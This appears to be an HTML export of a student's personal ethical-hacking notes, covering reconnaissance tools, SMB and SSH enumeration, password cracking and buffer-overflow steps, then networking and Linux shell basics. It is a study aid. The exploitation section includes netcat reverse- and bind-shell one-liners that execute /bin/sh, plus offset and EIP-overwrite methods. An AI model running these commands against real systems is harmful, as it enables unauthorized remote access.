<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Ethical hacking</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>Bug Bounty</h1><br/><p>Bugcrowd</p><p>HackerOne</p></div><div class='page'><h1 class='title level-1'>Pentesting</h1><br/></div><div class='page'><h1 class='title level-2'>Reconnaisance</h1><br/><p>Information gathering about the target (active and passive)</p><p></p></div><div class='page'><h1 class='title level-3'>Passive</h1><br/><p>OSINT</p></div><div class='page'><h1 class='title level-4'>Target Validation</h1><br/><p>WHOIS</p><p></p><p>nslookup</p><p></p><p>dnsrecon</p></div><div class='page'><h1 class='title level-4'>Subdomains</h1><br/><p>Find subdomains: <ol><li>Google Fu(Dorking): Using google <a href="https://ahrefs.com/blog/google-advanced-search-operators/">syntax</a> to narrow down pages or using pre built resources</p><p></li></ol><img src="images/4-1.png" alt="images/4-1.png" /><ol><li>dig</li><li><a href="Pentesting--Reconnaisance--Tools--Nmap_11.html">nmap</a></li><li><a href="Pentesting--Reconnaisance--Passive--Subdomains--Sublist3r_10.html">sublist3r</a></li><li>bluto</li><li><a href="Pentesting--Reconnaisance--Passive--Subdomains--Crt_9.html">crt.sh</a></li></ol></p><p></p><p>special tool: OWASP AMASS (check out later)</p><p></p><p>once having a list of subdomains, use http probe to check which are alive abd accessible (check out later)</p></div><div class='page'><h1 class='title level-5'>Crt</h1><br/><p></p><p><a href="http://crt.sh">Crt.sh</a></p><p></p><p><img src="images/9-1.png" alt="images/9-1.png" /> </p><p></p><p>can be used to find sub and sub-sub domains</p><p></p><p>uses signature based certificate search to find all the certificates relating to that doamin</p></div><div class='page'><h1 class='title level-5'>Sublist3r</h1><br/><p>Cli tool for Domain listing</p><p></p><p>command: sublist3r -d chennai.vit.ac.in -t 100 </p><p></p><p><img src="images/10-1.png" alt="images/10-1.png" /> </p></div><div class='page'><h1 class='title level-4'>Fingerprinting</h1><br/><p>Fingerprinting a website, i.e finding all the specifics of that website such as Technologies and ports</p><p><ol><li><a href="Pentesting--Reconnaisance--Tools--Nmap_11.html">nmap</a></li><li>wappalyzer: firefox extension like shodan to get web technologies</li><li>whatweb: CLI tool to quickly get technologies and info about a website. [whatweb vit.ac.in] </li></ol></p><p> <img src="images/5-1.png" alt="images/5-1.png" /> </p><p></p><p><ol><li><a href="http://builtwith.com">builtwith</a>: an online tool that can pull detail about all the technologies a web app is running </li></ol><img src="images/5-2.png" alt="images/5-2.png" /> </p><p></p><p><ol><li><a href="Networking--tools--Netcat_42.html">netcat</a></li><li>BurpSuite</li></ol></p></div><div class='page'><h1 class='title level-4'>Data breaches</h1><br/><p>Breachparse, HaveIbeenpwned, Weleakinfo</p></div><div class='page'><h1 class='title level-4'>Email</h1><br/><p>Finding email addresses for people from a specific organisation:</p><p><ol><li><a href="http://hunter.io">hunter.io</a> (vit account, name=astral boy, number=95400....)</li><li><a href="http://phonebook.cz">phonebook.cz</a>(intelx login: oscar)</li></ol></p></div><div class='page'><h1 class='title level-3'>Active</h1><br/><p>Interacting with the target, direct scanning and enumeration</p><p></p><p>finding ports, services and their versions</p><p></p><p>can use rapid7, exploit db and searchsploit to find payloads for potentially vulnurable services if any</p></div><div class='page'><h1 class='title level-4'>directory enumeration</h1><br/><p>Find carious directories/files/pages on the given domain</p><p></p><p>tools:</p><p><a href="Pentesting--Reconnaisance--Tools--Dirbuster_15.html">dirbuster</a></p><p>dirb</p><p>gobuster</p></div><div class='page'><h1 class='title level-4'>SMB Enumeration</h1><br/><p><a href="Networking--Protocols--SMB_and_samba_81.html">Samba protocol (file share) - port 445</a></p><p></p><p>metasploit can be used to get version info and enumerate (msfconsole, use auxiliary/scanner/smb/smb_version)</p><p></p><p>smbclient can be used to connect to machine [smbclient -L \\\\&lt;ip&gt;\\]</p><p></p><p><img src="images/16-1.png" alt="images/16-1.png" /> </p></div><div class='page'><h1 class='title level-4'>SSH Enumeration</h1><br/><p>Secure shell (port 22)</p><p></p><p>How to connect to a machie when you don&#39;t have keys</p><p></p><p>ssh &lt;ip&gt;</p><p><img src="images/18-1.png" alt="images/18-1.png" /> </p><p></p><p>ssh &lt;ip&gt; -oKexAlgorithms=+&lt;algorithm&gt;</p><p></p><p><img src="images/18-2.png" alt="images/18-2.png" /> </p><p></p><p>ssh &lt;ip&gt; -oKexAlgorithms=+&lt;algorithm&gt; -c &lt;cipher&gt;</p><p></p><p><img src="images/18-3.png" alt="images/18-3.png" /> </p><p></p></div><div class='page'><h1 class='title level-3'>Tools</h1><br/></div><div class='page'><h1 class='title level-4'>Nikto</h1><br/><p>CLI Web application vulnerability scanner (aggressive)</p><p></p><p>command: nikto -h(host) vit.ac.in</p><p><img src="images/13-1.png" alt="images/13-1.png" /></p><p>Scans the website for ports, headers, service versions, potential vulnerabilities and dirbusting.</p><p></p><p>is really aggressive and can be identified and blocked by website, firewall and even web browser</p><p></p><p><img src="images/13-2.png" alt="images/13-2.png" /> </p></div><div class='page'><h1 class='title level-4'>Nessus</h1><br/></div><div class='page'><h1 class='title level-4'>Nmap</h1><br/><p>nmap -T4 -p- -A -v &lt;ip&gt;</p></div><div class='page'><h1 class='title level-4'>Dirbuster</h1><br/><p>automatic script to send requests to a web domain using wordlists to discover various files and pages hosted (GUI)</p><p></p><p><img src="images/15-1.png" alt="images/15-1.png" /> </p><p></p><p>as it sends 100s of requests spontaneously, it is ratelimited and thus starts crashing as requests are dropped by server</p><p></p><p>Results:</p><p></p><p><img src="images/15-2.png" alt="images/15-2.png" /></p><p></p><p> </p></div><div class='page'><h1 class='title level-2'>Exploitation</h1><br/></div><div class='page'><h1 class='title level-3'>Shell Connections</h1><br/><p>Shell connections can be made using various tools to open and connect to a port, ex: <a href="Networking--tools--Netcat_42.html">netcat</a></p><p>1)Reverse Shells: Open a port in target machine and have it connect to us, this is preferred since firewalls don&#39;t really block outgoing connections.</p><p></p><p>ex: <strong>Attacker side</strong>= nc -lvp(open port and listen to connections) &lt;port&gt;(port number to open), </p><p><strong>Target machine</strong>=nc &lt;ip&gt; &lt;port&gt; -e(execute) /bin/sh (to execute shell on target machine once connection established, i.e get a shell access of target machine on attack machine)</p><p></p><p>2)Bind Shell: Attacker connects to the machine, hence has to bypass firewall also. </p><p></p><p>ex: <strong>Attacker</strong>= nc &lt;ip&gt; &lt;port&gt; (connect to target machine),</p><p> <strong>Target Machine</strong>= nc -lvp &lt;port&gt; -e /bin/sh (open port, listen for connections and execute shell over that connection once established)</p></div><div class='page'><h1 class='title level-3'>Password Cracking</h1><br/></div><div class='page'><h1 class='title level-4'>Bruteforcing</h1><br/><p><a href="Pentesting--Exploitation--Tools--Hydra_47.html">Hydra</a> Can be used</p><p><img src="images/46-1.png" alt="images/46-1.png" /> </p></div><div class='page'><h1 class='title level-4'>Dictionary</h1><br/><p><a href="Pentesting--Exploitation--Tools--Burpsuite_50.html">Burpsuite</a> can be used for web based login cracking<ol><li>Credential Stuffing: Using known leaked usernames and passwords to check if they work</li><li>Password spraying: using Probable passwords with all the known accounts to check if they work</li></ol></p></div><div class='page'><h1 class='title level-3'>Tools</h1><br/></div><div class='page'><h1 class='title level-4'>Burpsuite</h1><br/></div><div class='page'><h1 class='title level-4'>Metasploit</h1><br/></div><div class='page'><h1 class='title level-4'>Hydra</h1><br/></div><div class='page'><h1 class='title level-3'>Buffer Overflow</h1><br/><p>Overriding Buffer space in stack to reach the eip(instruction pointer) and include malicious code</p><p></p><p><img src="images/54-1.png" alt="images/54-1.png" /> </p><p></p><p>Note: Vuln server and immunity debugger are used in windows for the following steps</p></div><div class='page'><h1 class='title level-4'>Spiking</h1><br/><p>Spiking: Find vulnerable commands over a network</p><p></p><p>Command: generic_send_tcp (tries to find vulnerable applications over a tcp connection by overflowing using a spike script)</p><p><img src="images/55-1.png" alt="images/55-1.png" /> </p><p></p><p>spike script: it will follow the script once connection is established to actually navigate over the application, once we get to the required command to check, keep variable 0 to start bruteforcing (ig is determined by skipvar and skipstr parameters, not sure though)</p><p></p><p>Script:</p><p>s_readline(); [press enter/go to next line]</p><p>s_string(&quot;[command to send]&quot;); [send string and press enter]</p><p>s_string_variable(&quot;0&quot;); [in this place every random string will be sent to attempt buffer overflow]</p><p><img src="images/55-2.png" alt="images/55-2.png" /> </p><p></p><p><img src="images/55-3.png" alt="images/55-3.png" /> </p><p></p><p>Once the vulnerable command is found we can do fuzzing, i.e try to get detailed evaluation of the command, where it crashes, etc.</p><p></p><p>A simple python script can be used to determine buffer size and command tolerance</p><p></p><p><img src="images/55-4.png" alt="images/55-4.png" /> </p><p></p><p><img src="images/55-5.png" alt="images/55-5.png" /> </p><p><img src="images/55-6.png" alt="images/55-6.png" /> </p></div><div class='page'><h1 class='title level-4'>finding offset</h1><br/><p>pattern create: creates a pattern of sudo random characters of given length, we can then use this patter to overflow the buffer and based on the values written in eip it will give us it&#39;s offset. </p><p></p><p>command  ‚Äú/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size of stack/approx bytes to overwrite eip found from spiking]‚Äù </p><p></p><p><img src="images/79-1.png" alt="images/79-1.png" /> </p><p></p><p></p><p>can use python to send it over the network</p><p></p><p><img src="images/79-2.png" alt="images/79-2.png" /> </p><p></p><p>Valuess overwritten with specific bytes:</p><p><img src="images/79-3.png" alt="images/79-3.png" /> </p><p></p><p>pattern offset: uses the found values to find the byte offset for eip or basically anything </p><p></p><p>command  ‚Äú/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size of stack/approx bytes to overwrite eip found from spiking] -q [found values in eip]‚Äù </p><p></p><p><img src="images/79-4.png" alt="images/79-4.png" /> </p><p></p><p>therefore the eip offset is 2003 bytes.</p></div><div class='page'><h1 class='title level-4'>Overwriting eip</h1><br/><p>now we know the offset (ex: 2003)</p><p></p><p>we can send code as ‚ÄúA‚Äù*2003 + ‚ÄúB‚Äù*4 if we want B to overwrite the 4 bytes of eip</p><p></p><p><a href="https://github.com/cytopia/badchars">Badcharacters </a>: These are hex characters with special meanings attached to them by the program</p><p></p><p>hence we cannot use them in our shell code as they will be parsed and the program will act on them first replacing them and hence breaking our shellcode.</p><p></p><p>We can check for bad chars by sending them to the program after the eip and seeing if they get parsed in the hexdump</p><p></p><p>Sending:</p><p><img src="images/80-1.png" alt="images/80-1.png" /> </p><p></p><p>Hex dump:</p><p><img src="images/80-2.png" alt="images/80-2.png" /></p><p></p><p>Special/bad characters like 04,28,29 etc were parsed by the proggram for special instructions</p><p>neutral/ non special random character (B0) was replaced in it&#39;s place</p><p></p><p>for sequence of 2 chracters, ex: 04,05 only the first one is bad</p><p></p><p>now we can write the shellcode without utilizing any of these characters so it doesn&#39;t break. like the above code was changed while parsing</p><p></p></div><div class='page'><h1 class='title level-2'>Resources</h1><br/><p><a href="https://0xffsec.com/handbook/">0xffsec handbook</a></p><p></p><p><a href="https://book.hacktricks.xyz/welcome/readme">hacktricks</a></p></div><div class='page'><h1 class='title level-1'>Networking</h1><br/></div><div class='page'><h1 class='title level-2'>OSI Model</h1><br/><p><ol><li>P= Physical- data cables, cat 6</li><li>D= Data- Switching, Mac Addresss</li><li>N= Network- IP addresses, routing</li><li>T= Transport- TCP/UDP</li><li>S= Session- Session management</li><li>P= Presentation- WMV,JPEG,MOV</li><li>A= Application- HTTP, SMTP</li></ol></p><p></p><p>Please Do Not Throw Sausage Pizza Away</p></div><div class='page'><h1 class='title level-2'>Subnetting</h1><br/><p>Allows number of hosts for a network by locking in the static and dynamic bits</p><p></p><p><img src="images/27-1.png" alt="images/27-1.png" /> </p><p> </p><p> Structure of netmask:</p><p> <img src="images/27-2.png" alt="images/27-2.png" /> </p><p> </p><p> same structure as ip address (octals), but the bits can only be turned on in order.</p><p> </p><p> The turned on bits are fixed and cannot be changed by any nic or networking device, ex: wifi devices cannot be assigned to these addresses/ any protocol cannot modify these values. </p><p> </p><p> for ex: a wifi base address with 192.168.232.0 and netmask 255.255.255.0 signifies the first 24 bits are turned on( all 255) hence when assigning ip address, these cannot be changed. i.e 192.168.232 are fixed values and cannot be changed by router or anything.</p><p> </p><p> hence the effective address that can be allocated to devices on the network are 192.168.232.0-255 i.e 256 hosts (2^8 as the last 8 bits are left unset and these places can be used) hence 254 devices can be connected to this network (first and last address are reserved for network id and broadcast)</p><p> </p><p> since the first 24 bits are set, the address and the subnet can be represented as: 192.168.232.0/24 where the /24 signifies the number of set bits.</p><p> </p><p> ex: 192.168.0.0/23 signifies only 23 bits are set, i.e: 11111111.11111111.11111110.00000000=255.255.254.0</p><p> </p><p> therefore (2^9) 512 hosts can be accomodated out of which the last decimal can range from 0-255 (2^8 unset bits) and the 2nd last can range 0-1 (2^1 unset bits)</p><p> </p><p> hence possible ip ranges are 192.168.0.0-255, 192.168.1.0-255</p><p> </p><p> <img src="images/27-3.png" alt="images/27-3.png" /> </p><p> </p><p> <img src="images/27-4.png" alt="images/27-4.png" /></p><p> </p><p>  </p></div><div class='page'><h1 class='title level-2'>Addresses</h1><br/></div><div class='page'><h1 class='title level-3'>IP Address</h1><br/><p>ifconfig</p><p></p><p><img src="images/29-1.png" alt="images/29-1.png" /> </p><p></p><p></p><p>layer3 of osi model (router)</p><p></p><p>public and private ip addresses exist, translation is done by <a href="Networking--Addresses--IP_Address--NAT_32.html">NAT</a></p></div><div class='page'><h1 class='title level-4'>ipv4</h1><br/><p>Decimal notation</p><p></p><p>1  and 0 put together for human readable format</p><p></p><p>ex: 192.168.57.139, each number is just decimal representation on a binary octal. ex: 11111111.11111111.11111111.11111111=255.255.255.255 (4*8=32 bits)</p><p></p><p>approx 4 billion addresses (2^32) , almost all are used up, hence we use<a href="Networking--Addresses--IP_Address--NAT_32.html"> NAT</a></p></div><div class='page'><h1 class='title level-4'>ipv6</h1><br/><p>hexadecimal notation (128 bits, possible combinations, 2^128)</p></div><div class='page'><h1 class='title level-4'>NAT</h1><br/><p>Network Address translation</p><p><img src="images/32-1.png" alt="images/32-1.png" /> </p><p></p><p>Translates private address to public address since limited number of ipv4 address available</p><p></p><p>various private address are interfaced to single public address using nat</p><p></p><p>public addresses are brought by various organisation such as isp</p></div><div class='page'><h1 class='title level-3'>MAC Address</h1><br/><p>Media access control</p><p></p><p><img src="images/33-1.png" alt="images/33-1.png" /> </p><p></p><p>physical address: comes with network interface cards(nic) and allows for physical switches to read and transport messages</p><p></p><p>Layer 2 (switching) </p><p></p><p>MAc Adddress: first three pairs are <a href="https://maclookup.app/">identifiers</a>, i.e: 58:6c:25</p><p></p><p><img src="images/33-2.png" alt="images/33-2.png" /></p></div><div class='page'><h1 class='title level-2'>Protocols</h1><br/><p>Layer 4 of the OSI model (transport layer)</p><p></p><p>utilizes <a href="Networking--Protocols--Ports_38.html">ports</a> for communication (65k+ ports)</p></div><div class='page'><h1 class='title level-3'>TCP</h1><br/><p>Transmission control protocol</p><p></p><p>connection oriented	. ex: http, https, ftp, ssh</p><p></p><p>Works on <a href="Networking--Protocols--3_way_handshake_37.html">3 way handshake</a></p></div><div class='page'><h1 class='title level-3'>UDP</h1><br/><p>User datagram protocol</p><p></p><p>Connection less, ex: voip,dns</p></div><div class='page'><h1 class='title level-3'>3 way handshake</h1><br/><p>SYN &gt; SYN ACK&gt; ACK</p><p></p><p>SYN: Synchronize (initiate connection)</p><p>ACK: Acknowledge</p></div><div class='page'><h1 class='title level-3'>Ports</h1><br/><p><a href="https://www.stationx.net/common-ports-cheat-sheet/">ports-cheatsheet</a> </p><p></p><p></p><p>7	Echo</p><p>20, 21	FTP</p><p>22	SSH/SCP</p><p>23	Telnet</p><p>25	SMTP</p><p>53	DNS</p><p>67, 68	DHCP/BOOTP</p><p>69	TFTP</p><p>80	HTTP</p><p>88	Kerberos</p><p>110	POP3</p><p>123	NTP</p><p><a href="Networking--Protocols--MSRPC_85.html">135 MSRPC</a></p><p><a href="Networking--Protocols--Net-Bios_82.html">137,138,139	NetBIOS</a></p><p>143	IMAP</p><p>161	SNMP</p><p>194	IRC</p><p>389	LDAP</p><p>443	HTTPS</p><p><a href="Networking--Protocols--SMB_and_samba_81.html">445	Microsoft DS SMB</a></p><p>464	Kerberos password settings</p><p>547		DHCPv6</p><p>596	SMSD</p><p>636	LDAP over SSL</p><p>1720	H.323</p><p>3389	RDP</p><p>5060	SIP</p><p>5061	SIP over TLS</p></div><div class='page'><h1 class='title level-3'>ARP</h1><br/><p>Address resolution protocol</p></div><div class='page'><h1 class='title level-3'>SMB and samba</h1><br/><p>what is samba?</p><p></p><p>Samba is a *nix(unix,linux etc) implementation of smb (network filesharing protocol)</p><p></p><p>‚ÄúSamba runs on Unix platforms, but speaks to Windows clients like a native. It allows a Unix system to move into a Windows ‚ÄúNetwork Neighbourhood‚Äù without causing a stir.&quot; ~samba.org</p><p></p><p>The Samba suite of tools is heavily utilised by Linux SMB enumeration tools such as <a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a> (and its continuation, <a href="https://github.com/cddmp/enum4linux-ng">-ng</a>).</p><p></p><p></p><p><h2>Microsoft SMB Protocol</h2></p><p></p></div><div class='page'><h1 class='title level-3'>Net-Bios</h1><br/><p>NetBIOS is an old (1980s) session layer service that offers an API for communication between applications on a LAN, that predates TCP/IP. It‚Äôs not a protocol itself, but an API that leverages other communications protocol (ex: NBT leverages tcp, NBF: IEEE 802.2 LLC, NBX: NetWare&#39;s IPX/SPX)</p><p></p><p>In modern networks, NetBIOS runs over TCP/IP, termed NBT‚Å¥ (or NetBT) and hence allows netbios services over tcp</p><p></p><p>NetBIOS is used as a fallback for name resolution only when mDNS (firstly), and then LLMNR (secondly) queries fail.</p><p></p><p>NetBIOS effectively offers backwards compatibility for network devices that predate compatibility with DNS</p><p></p><p>Netbios services:</p><p><ol><li>137- <a href="Networking--Protocols--Net-Bios--Netbios-ns_83.html">137- Netbios-ns</a> : name service</li></ol></p><p><ol><li>Netbios-dgm: sending and receiving of connectionless, non-sequenced datagrams between hosts (allows to discover smb hosts in the network)</li><li>139- <a href="Networking--Protocols--Net-Bios--Netbios-ssn_84.html">139- Netbios-ssn</a>: allows for establishing connections and transfer of data</li></ol></p></div><div class='page'><h1 class='title level-4'>Netbios-ns</h1><br/><p><strong>Netbios-ns</strong> (137): name service (kinda like dns, resolves netbios names for communication on lan)</p><p></p><p>The NetBIOS name is usually derived from the computer name, but is limited to 16 octets in length, where the final octet (NetBIOS suffix) designates the type of resource. Thus, NetBIOS names are effectively limited to 15 legal UTF-8 characters. <a href="https://www.itprotoday.com/compute-engines/knowing-angles-netbios-suffixes#close-modal">Common suffixes</a> are: </p><p></p><p>00, Workstation Service; 20, File Service; and 21, Remote Access Service.</p><p></p><p>in an NBT network (running over TCP/IP) the name service translates NetBIOS names to IP addresses (since host names translate to ip address in IP) </p><p>as Netbios is an api, it allows for the user to have the same hostname and communicate over different protocols as it&#39;s the job of netbios to translate Netbios name</p><p>to specific identifier for the used protocol</p><p></p><p>NetBIOS names registered by a host can be inspected with nbtstat -n (ü™ü), or enum4linux -n or Nmap‚Äôs nbstat script (üêß).</p><p></p><p>command: sudo nmap -sU --script nbstat.nse -p&lt;port of sn&gt; &lt;host&gt;</p><p></p><p>*note: eventhough the machine i am trying has ssn(session) open on 139, nmap still seems to enumerate on 137</p><p>gemini indicates that the session maybe running on 139, it can still be utilizing 137 for name resolution as a service port</p><p></p><p><span style="text-decoration:underline;">therefore, in netbios, the session for file transfer is open on 139, but name service still operates on 137 eventhough it may not show up on an nmap scan</span></p><p></p><p><img src="images/83-1.png" alt="images/83-1.png" /> </p><p></p><p>Resolving a NetBIOS name is accomplished through either the lmhosts file (think hosts, but for NetBIOS)</p><p></p><p>In NBT, netbios-ns operates on UDP port 137, sometimes TCP port 137</p></div><div class='page'><h1 class='title level-4'>Netbios-ssn</h1><br/><p>Session service: allows for communication between netbios applications  through establishing connections (hence this port was open)</p><p></p><p>This is perhaps the most known Windows port of all, as it is used to transfer files over TCP. This is both the port that NULL Sessions are established over and the port that file and printer sharing takes place on</p><p></p><p>In NBT, netbios-ssn operates on TCP port 139‚Å¥, which is what we commonly see open in an Nmap TCP scan.</p><p></p></div><div class='page'><h1 class='title level-3'>MSRPC</h1><br/><p>MSRPC is Microsoft&#39;s implementation of RPC(<a href="https://docs.microsoft.com/en-us/windows/win32/rpc/how-rpc-works">remote procedure calls</a>)</p><p></p><p></p><p>RPC: are used to call procedures on networked computers (or locally, between processes!). </p><p>This way, programmers can implement distributed software as if it was operating on a single machine, without having to worry about the underlying network code.</p><p></p><p>MSRPC: Communication mechanisms</p><p></p><p><a href="https://miro.medium.com/v2/resize:fit:700/1*tw3ZhRj_D5wpo_M_Kvfh6g.png"><img src="images/85-1.png" alt="images/85-1.png" /></a> </p><p></p><p>When an RPC server receives a request, the endpoint may not be known by the client. In this case, the endpoint mapper (EPM) is consulted.</p><p></p><p><a href="Networking--Protocols--MSRPC--Endpoint_mapper_87.html">port135: msrpc endpoint mapper service</a></p></div><div class='page'><h1 class='title level-4'>Working details</h1><br/><p></p><p><h2>Operation</h2></p><p><a href="https://miro.medium.com/v2/resize:fit:264/0*haE6XPlWf2b7uGAG.gif"><img src="images/86-1.png" alt="images/86-1.png" /></a></p><p>This image was probably created before I was born. Image source: Microsoft Docs [10]1. A process loads an RPC server and registers its universally unique<strong> interface ID (IFID)</strong> with the RPC runtime¬π¬π. The interface acts as a bridge between client and server; the client must <strong>implement </strong>the interface, and the server must <strong>expose </strong>the exact same interface.<ol><li>Client code implements the interface ‚Äî the server IFID is known to the client.</li><li>When the client process executes a method via RPC, the parameters are passed to a stub function, which is called in place of the desired procedure. The stub passes the parameters to a Network Data Representation (NDR) engine for serialisation in a common format. This is necessary as data representation formats might differ between client and server systems.</li><li>The client stub then invokes the RPC runtime library,<strong> which transports the serialised data to the server application</strong>. This can be achieved via several methods: TCP and UDP, named pipes, or even HTTP. The endpoint is either known (such as a port or named pipe), or the IFID is used to identify it (read on).</li><li>The server RPC runtime accepts the incoming communication and calls the server stub procedure. The stub retrieves the parameters from the network buffer, deserialises the data, and calls the <strong>actual</strong> procedure.</li><li>The return value (if any), is returned to the client via a similar set of steps.</p><p></li></ol><a href="https://miro.medium.com/v2/resize:fit:431/0*4w2eZy1A4OyZGw4f.gif"><img src="images/86-2.png" alt="images/86-2.png" /></a> </p><p></p><p></p></div><div class='page'><h1 class='title level-4'>Endpoint mapper</h1><br/></div><div class='page'><h1 class='title level-2'>tools</h1><br/></div><div class='page'><h1 class='title level-3'>Netcat</h1><br/></div><div class='page'><h1 class='title level-1'>Linux</h1><br/></div><div class='page'><h1 class='title level-2'>Bash shell</h1><br/></div><div class='page'><h1 class='title level-3'>Shell Variables</h1><br/><p>Shell variables are used to store information within the shell. This information is</p><p>used to modify the behavior of the shell itself or external commands</p><p></p><p><a href="https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Shell-Variables">docs</a></p><p></p><p><img src="images/63-1.png" alt="images/63-1.png" /> </p><p></p><p><img src="images/63-2.png" alt="images/63-2.png" /> </p><p></p></div><div class='page'><h1 class='title level-4'>set</h1><br/><p>to set and unset shell variables</p><p><a href="https://phoenixnap.com/kb/linux-set">usage</a></p><p>ex: set -x turns on debugger for the shell, i.e prints each line as executed (+x to unset)</p><p></p><p>new shells can be called with specific options set</p><p><img src="images/64-1.png" alt="images/64-1.png" /> </p><p></p><p>interesting options: noexec, -x , verbose, -C (prevents overwriting files) </p><p><img src="images/64-2.png" alt="images/64-2.png" /> </p><p><img src="images/64-3.png" alt="images/64-3.png" /> </p><p></p><p></p></div><div class='page'><h1 class='title level-4'>PS1</h1><br/><p>Prompt string</p><p></p><p>PS1 is (one of) the shell variable responsible for our interaction with the terminal.</p><p></p><p>ps 0-4 all define various parts of the shell we interact with, ps1 defines the prompt we see, i.e the cosmetics of the the prompt</p><p><img src="images/65-1.png" alt="images/65-1.png" /></p><p> this appearence is set by ps1 and can be changed similarly</p><p> both <a href="Linux--Bash_shell--Shell_Variables--PS1--bash_66.html">bash</a> and <a href="Linux--Bash_shell--Shell_Variables--PS1--zsh_67.html"> zsh</a> have different ways of handling this variable</p><p></p><p></p><p></p><p>rest PS work with:</p><p><img src="images/65-2.png" alt="images/65-2.png" /> </p></div><div class='page'><h1 class='title level-5'>bash</h1><br/><p>bash has it&#39;s own <a href="https://linuxsimply.com/bash-scripting-tutorial/variables/types/ps1/">syntax</a> for ps1</p><p></p><p><img src="images/66-1.png" alt="images/66-1.png" />  </p><p></p><p>this can be rewritten and modified</p><p></p><p><img src="images/66-2.png" alt="images/66-2.png" /> </p><p></p><p>these are stored in bashrc as ps1</p><p></p><p><img src="images/66-3.png" alt="images/66-3.png" /> </p></div><div class='page'><h1 class='title level-5'>zsh</h1><br/><p>zsh has it&#39;s own way of storing and modifying ps1 variable</p><p></p><p><img src="images/67-1.png" alt="images/67-1.png" /> </p><p></p><p>these text can be modified to change the overall appearence of the prompt</p><p></p><p><img src="images/67-2.png" alt="images/67-2.png" /> </p><p></p><p>these are saved in zshrc as Prompt</p><p></p><p><img src="images/67-3.png" alt="images/67-3.png" /> </p><p></p></div><div class='page'><h1 class='title level-4'>Path</h1><br/><p>Path is a shell variable that contains comma seperated list of directories</p><p><img src="images/68-1.png" alt="images/68-1.png" /> </p><p></p><p>when any command is typed, the specified directories are searched in order, if nothing is found an error can be thrown (the current directory is searched after the path directories)</p><p></p><p>to add a directory to path: PATH=&quot;$PATH:/path/to/add&quot;</p></div><div class='page'><h1 class='title level-3'>Environment variables</h1><br/><p>When a variable is created, it&#39;s available only in the ccurrent shell session (local variable)</p><p></p><p>A variable can be converted to environment variable hence any program or command connected to that shell session will have access to it.</p><p></p><p>a local variable can be converted to environment variable using <a href="Linux--Bash_shell--Environment_variables--export_71.html">export</a> command (for the current session)</p><p></p><p>When a variable is converted into an environment variable, all subprocesses</p><p>(commands or programs started by the shell) will have this variable set. This is</p><p>useful when you want to change the behavior of a process by modifying a key</p><p>variable.</p><p></p><p>command: env  (displays environment variables in the current shell)</p><p></p><p>To unset a variable when executing a command, use the --unset=VAR option</p><p>(for example, env --unset=TZ date)</p><p></p></div><div class='page'><h1 class='title level-4'>export</h1><br/><p>convert an existing local variable to an environment variable</p><p></p><p>If the variable doesn‚Äôt already exist, the export command can create it directly as an environment variable</p><p></p><p><img src="images/71-1.png" alt="images/71-1.png" /> </p><p></p><p>export -p: display all environment variables</p></div><div class='page'><h1 class='title level-3'>Initialisation files</h1><br/><p>initialization file: A file that is executed when a shell starts in order to customize</p><p>the environment for the user.</p><p></p><p>login shell: the initial shell started when a user logins</p><p></p><p>Which initialization files are executed depends on whether the shell is a login shell or a non-login shell.</p><p></p><p><img src="images/72-1.png" alt="images/72-1.png" /> </p><p><ol><li>profile: first file to execute on login, sets enviorment variables and messages etc can be put in this file for all users to execute upon login, executes all .sh files in profile.d that sets up the shell</li><li>bash_profile: the next files are executed from the users home directory, these include (in priority) bash_profile,bash_login,profile(found in kali). bash will look for each of these file and execute the ones</li></ol></p><p>found first, the purpose of these files is to put message and setup for the particular usier logging in.</p><p>3)bashrc: found in home directory of each user, each user can put in code they want to be executed each time a shell session is started.</p><p>4)bash.bashrc: found in etc, is a systemwide bashrc file that will execute each time a shell session is started by any user, can put code common for all users. it may also call profile.d files</p><p>each time for initialisation of the new shell session.</p><p></p><p></p></div><div class='page'><h1 class='title level-3'>History</h1><br/><p>‚Äúhistory‚Äù command to view history of shell</p><p></p><p><img src="images/73-1.png" alt="images/73-1.png" /> </p><p></p><p>‚Äú!n‚Äù to execute nth command from history</p><p></p><p><img src="images/73-2.png" alt="images/73-2.png" /> </p><p></p><p><img src="images/73-3.png" alt="images/73-3.png" /> </p><p></p><p>history config variables:</p><p></p><p><img src="images/73-4.png" alt="images/73-4.png" /> </p><p><img src="images/73-5.png" alt="images/73-5.png" /> </p><p></p><p>.bash_history file stores the history once the current session is closed, another file can be used using HISTFILE variable</p><p>size of this file can be limited using HISTFILESIZE variable</p></div><div class='page'><h1 class='title level-3'>Redirection</h1><br/><p><img src="images/74-1.png" alt="images/74-1.png" /> </p></div><div class='page'><h1 class='title level-3'>subcommands</h1><br/><p>takes the output of one command and uses it for argument of another (similar to piping ig)</p><p></p><p>we can use $() in a command to include another command</p><p></p><p><img src="images/76-1.png" alt="images/76-1.png" /> </p></div><div class='page'><h1 class='title level-2'>Commands</h1><br/><p><a href="https://fossbytes.com/a-z-list-linux-command-line-reference/">resource</a></p><p></p><p><a href="file:///home/astral/notes/linux commands cheatsheet.pdf">Cheatsheet</a></p></div><div class='page'><h1 class='title level-3'>Chmod</h1><br/><p><img src="images/21-1.png" alt="images/21-1.png" /> </p></div><div class='page'><h1 class='title level-3'>ls</h1><br/><p><img src="images/57-1.png" alt="images/57-1.png" /> </p><p></p><p><img src="images/57-2.png" alt="images/57-2.png" /> </p></div><div class='page'><h1 class='title level-3'>Globbing (special character)</h1><br/><p>Use special characters to fill space of actual names</p><p></p><p></p><p> <img src="images/58-1.png" alt="images/58-1.png" /> </p><p> </p><p> ex:</p><p> <img src="images/58-2.png" alt="images/58-2.png" /> </p><p> </p></div><div class='page'><h1 class='title level-3'>less</h1><br/><p>Display large file contents in scrollable format, advanced version of more, also has searching and many advanced functionalities built in</p><p></p><p><img src="images/59-1.png" alt="images/59-1.png" /> </p><p></p></div><div class='page'><h1 class='title level-3'>head and tail</h1><br/><p>head: display top 10 lines of a file</p><p></p><p>head -n display top n lines</p><p></p><p>tail: display bottom 10 lines</p><p> tail -n display bottom n lines</p><p> </p><p> <img src="images/60-1.png" alt="images/60-1.png" /> </p><p> </p><p> <img src="images/60-2.png" alt="images/60-2.png" /> </p><p> </p><p> </p></div><div class='page'><h1 class='title 